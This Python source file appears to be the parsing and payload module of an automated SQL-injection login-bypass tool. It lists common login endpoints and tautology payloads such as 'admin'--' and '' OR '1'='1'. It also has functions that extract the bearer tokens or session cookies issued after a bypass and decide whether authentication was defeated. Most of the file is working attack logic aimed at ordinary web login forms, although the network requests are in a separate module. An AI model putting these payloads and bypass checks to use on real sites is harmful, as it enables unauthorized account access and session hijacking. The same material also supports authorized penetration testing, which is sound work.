"""
Pure parsing, payload generation, and response signature detection for sqli_login.
No I/O or network requests here.
"""
from __future__ import annotations

import urllib.parse
from dataclasses import dataclass
from typing import Any, Dict, List, Optional, Tuple

DEFAULT_LOGIN_PATHS: Tuple[str, ...] = (
    "/login",
    "/logon",
    "/signin",
    "/auth/login",
    "/api/login",
    "/rest/user/login",
    "/wp-login.php",
)

DEFAULT_USER_FIELDS: Tuple[str, ...] = (
    "username",
    "email",
    "user",
    "login",
)

DEFAULT_TAUTOLOGY_PAYLOADS: Tuple[str, ...] = (
    "admin'--",
    "' OR '1'='1",
    "admin' OR '1'='1'--",
    "' OR 1=1#",
    '" OR ""="',
    "' OR ''='",
)

SESSION_COOKIE_NAMES: Tuple[str, ...] = (
    "session",
    "sid",
    "jsessionid",
    "phpsessid",
    "token",
    "auth",
    "connect.sid",
)


@dataclass
class RawSqliLoginResult:
    target: str = ""
    login_url_used: Optional[str] = None
    success: bool = False
    auth_type: Optional[str] = None
    token: Optional[str] = None
    payload_used: Optional[str] = None
    field_used: Optional[str] = None
    error: Optional[str] = None


def normalize_target_url(target: str) -> str:
    """Normalize target to full URL defaulting to http://."""
    target = target.strip()
    if not target:
        return ""
    if target.startswith("http://") or target.startswith("https://"):
        return target
    return f"http://{target}"


def parse_host_port(target: str) -> Tuple[str, int]:
    """Extract host and port from target URL or host string."""
    parsed = urllib.parse.urlsplit(target if "://" in target else f"//{target}")
    host = parsed.hostname or target
    port = parsed.port or (443 if parsed.scheme == "https" else 80)
    return host, port


def resolve_candidate_urls(target: str, login_path: str = "") -> List[str]:
    """Resolves list of target login endpoint URLs to test."""
    url = normalize_target_url(target)
    if not url:
        return []

    if login_path and login_path.strip():
        return [urllib.parse.urljoin(url, login_path.strip())]

    parsed = urllib.parse.urlsplit(url)
    if parsed.path and parsed.path not in ("/", ""):
        return [url]

    base = url.rstrip("/")
    return [base + p for p in DEFAULT_LOGIN_PATHS]


def extract_token_from_response(
    data: Optional[Dict[str, Any]],
    headers: Dict[str, str],
    cookies: Dict[str, str],
    status_code: int,
) -> Tuple[Optional[str], Optional[str]]:
    """Extracts bearer token or session cookie from HTTP response."""
    # 1. Bearer token in JSON response body
    if status_code in (200, 201) and isinstance(data, dict):
        token = (
            (data.get("authentication") or {}).get("token")
            or data.get("access_token")
            or data.get("token")
            or data.get("jwt")
            or data.get("session_token")
        )
        if token and isinstance(token, str):
            return token, "bearer"

    auth_header = headers.get("Authorization") or headers.get("authorization")
    if auth_header and "Bearer " in auth_header:
        return auth_header.split("Bearer ", 1)[1].strip(), "bearer"

    # 3. Session cookie in cookies
    for name, value in cookies.items():
        name_lower = name.lower()
        if any(k in name_lower for k in SESSION_COOKIE_NAMES):
            return f"{name}={value}", "session"

    return None, None


def is_login_bypass(
    baseline_status: int,
    baseline_cookies: Dict[str, str],
    current_status: int,
    current_cookies: Dict[str, str],
    token: Optional[str],
) -> bool:
    """Evaluates whether the response signals an authentication bypass."""
    if token:
        return True

    # Redirect to dashboard / application with a newly issued cookie
    if current_status in (301, 302, 303):
        new_cookies = set(current_cookies.keys()) - set(baseline_cookies.keys())
        if any(any(k in c.lower() for k in SESSION_COOKIE_NAMES) for c in new_cookies):
            return True

    # Changed status code (e.g. baseline 401/403/400 -> current 200/302) with session cookie
    if current_status in (200, 302) and baseline_status in (401, 403, 400):
        if any(any(k in c.lower() for k in SESSION_COOKIE_NAMES) for c in current_cookies):
            return True

    return False


def parse_sqli_login_result(raw: RawSqliLoginResult) -> Dict[str, Any]:
    """Transforms raw bypass probe result into structured output."""
    return {
        "target": raw.target,
        "login_url": raw.login_url_used,
        "success": raw.success,
        "auth_type": raw.auth_type,
        "token": raw.token,
        "payload_used": raw.payload_used,
        "field_used": raw.field_used,
        "error": raw.error,
    }
